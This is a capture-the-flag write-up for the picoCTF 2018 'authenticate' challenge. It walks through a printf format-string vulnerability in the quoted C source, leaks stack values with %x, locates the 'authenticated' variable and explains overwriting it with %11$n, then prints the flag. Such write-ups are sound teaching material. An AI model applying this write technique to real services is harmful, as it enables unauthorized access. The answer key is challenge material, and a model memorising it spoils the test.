# authenticate
Points: 350

## Category
Binary Exploitation

## Question
>Can you [authenticate](files/auth) to this service and get the flag? Connect with nc 2018shell1.picoctf.com 27114. [Source](files/auth.c).  

### Hint
>What happens if you say something OTHER than yes or no?

## Solution
Looking at the source code, there appears to be some sort of authentication service, with no actual way to authenticate.

We can see that there's an _authenticated_ variable, which is set to _0_, and never changed anywhere in the code. We also notice that there is possibly a form of format string vulnerability.

```c
int main(int argc, char **argv) {
	char buf[64];
	printf("Would you like to read the flag? (yes/no)\n");

	fgets(buf, sizeof(buf), stdin);

	if (strstr(buf, "no") != NULL) {
		printf("Okay, Exiting...\n");
		exit(1);
	}
	else if (strstr(buf, "yes") == NULL) {
		puts("Received Unknown Input:\n");
		printf(buf); // Format String Vulnerability
	} 
	read_flag();
}
```

We can try running the binary and inputting _%x_ to see if any values from the stack leaks.

```
$ ./auth 
Would you like to read the flag? (yes/no)
%x%x
Received Unknown Input:

80489a6f7f235c0
Sorry, you are not *authenticated*!
```

Let's find out where the authenticated varialbe is located and its corresponding value.

```
[0x08048560]> s obj.authenticated 
[0x0804a04c]> px 4
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x0804a04c  0000 0000                                ....
[0x0804a04c]> s
0x804a04c
```

Looks like it's located at _0x804a04c_ with a value of _0_. Let's craft an exploit. We add characters with familiar know hex values followed by multiple _%x_

```
$ ./auth 
Would you like to read the flag? (yes/no)
AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
Received Unknown Input:

AAAA 80489a6 f7f5b5c0 804875a 0 c30000 0 fffd3ff4 0 0 0 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 Sorry, you are not *authenticated*!
```

Looks like the 11th _%x_ did the trick. Now substitue _AAAA_ with the little endian values of the _authenticated_ variable's address and all the _%x_ with _%11$n_. This will overwrite the value of _authenticated_.

Send the exploit to the service and get the flag.

Working solution [solve.py](solution/solve.py).

### Flag
`picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_742b49a4}`
